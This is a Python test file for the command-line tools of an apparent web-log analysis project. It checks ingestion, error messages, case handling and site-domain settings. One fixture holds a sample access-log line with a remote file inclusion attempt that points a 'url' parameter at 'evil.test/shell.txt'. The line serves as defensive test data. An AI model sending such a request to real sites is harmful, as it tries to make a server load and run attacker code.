"""Tests for the developer tools, `zodiarc-dev`.

These check the contract a developer sees — exit codes and what is printed —
rather than internals, which the layers below already cover.
"""

from __future__ import annotations

from pathlib import Path

import pytest
import typer
from typer.testing import CliRunner

from zodiarc.case import Case
from zodiarc.devtools.main import app

runner = CliRunner()


def test_the_developer_tools_are_the_seven_adr_0012_keeps() -> None:
    """What only repeated the window was removed at the first release
    (ADR-0012). A command added back here would be a feature built twice."""
    names = {command.name for command in typer.main.get_command(app).commands.values()}

    assert names == {
        "ingest",
        "enrich",
        "evaluate",
        "score-crs",
        "benchmark",
        "convert-csic",
        "setup-crs",
    }


LINES = [
    '203.0.113.5 - - [10/Oct/2020:13:55:36 +0000] "GET / HTTP/1.1" 200 2326 "-" "curl/8.0"',
    '203.0.113.5 - - [10/Oct/2020:13:55:40 +0000] "GET /admin HTTP/1.1" 404 0 "-" "curl/8.0"',
    '198.51.100.9 - - [10/Oct/2020:13:56:00 +0000] "POST /login HTTP/1.1" 302 0 "-" "curl/8.0"',
]


@pytest.fixture
def log(tmp_path: Path) -> Path:
    path = tmp_path / "access.log"
    path.write_text("\n".join(LINES) + "\n", encoding="utf-8")
    return path


def test_ingest_reports_what_it_stored(log: Path, tmp_path: Path) -> None:
    result = runner.invoke(app, ["ingest", str(log), "--case", str(tmp_path / "case")])

    assert result.exit_code == 0
    assert "3" in result.stdout
    assert "apache-combined" in result.stdout


def test_ingest_creates_a_usable_case(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    assert (case / "case.json").exists()
    assert (case / "ip_index.parquet").exists()


def test_ingest_of_an_unrecognisable_file_fails_with_a_useful_message(
    tmp_path: Path,
) -> None:
    path = tmp_path / "notes.txt"
    path.write_text("just some notes\n", encoding="utf-8")

    result = runner.invoke(app, ["ingest", str(path), "--case", str(tmp_path / "case")])

    assert result.exit_code != 0
    assert "--format" in result.output


def test_ingest_of_a_missing_file_fails_cleanly(tmp_path: Path) -> None:
    result = runner.invoke(
        app, ["ingest", str(tmp_path / "gone.log"), "--case", str(tmp_path / "case")]
    )

    assert result.exit_code != 0
    assert "Traceback" not in result.output


def test_ingest_refuses_to_overwrite_an_existing_case(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    result = runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    assert result.exit_code != 0
    assert "already exists" in result.output


def test_version_is_reported() -> None:
    result = runner.invoke(app, ["--version"])

    assert result.exit_code == 0
    assert "Zodiarc" in result.stdout


# -- the site's own domains, which one rule needs and nothing else does -------
#
# The GUI asks this after a scan. These exist so the command line can answer it
# too — the project's rule is that anything the GUI can do is scriptable, and a
# rule that only fires for people who clicked a dialog would break it.

RFI_LINES = [
    "203.0.113.7 - - [10/Oct/2020:14:00:00 +0000] "
    '"GET /page?url=https://evil.test/shell.txt HTTP/1.1" 200 120 "-" "curl/8.0"',
    "203.0.113.7 - - [10/Oct/2020:14:00:05 +0000] "
    '"GET /page?url=https://shop.test/help HTTP/1.1" 200 120 "-" "curl/8.0"',
]


@pytest.fixture
def rfi_log(tmp_path: Path) -> Path:
    path = tmp_path / "rfi.log"
    path.write_text("\n".join(RFI_LINES) + "\n", encoding="utf-8")
    return path


def test_ingest_can_be_told_the_site_s_domains(rfi_log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"

    result = runner.invoke(
        app,
        ["ingest", str(rfi_log), "--case", str(case), "--site-host", "shop.test"],
    )

    assert result.exit_code == 0, result.output
    assert Case.open(case).site_hosts == ("shop.test",)


def test_enrich_prints_the_fingerprint_the_case_recorded(
    rfi_log: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The line is there so a report can be matched to the run behind it.

    A case that names its site is enriched against that host, not the one the
    command's own config carries, so printing the command's config named a
    configuration the case does not have.
    """

    def quiet_sidecar(events, **_kwargs):
        for _ in events:
            pass
        return []

    monkeypatch.setattr("zodiarc.enrich.run_sidecar", quiet_sidecar)
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case), "--site-host", "shop.test"])

    result = runner.invoke(app, ["enrich", "--case", str(case)], env={"COLUMNS": "200"})

    assert result.exit_code == 0, result.output
    with Case.open(case) as opened:
        recorded = opened.manifest.config["crs_fingerprint"]
    assert f"configuration {recorded}" in result.output
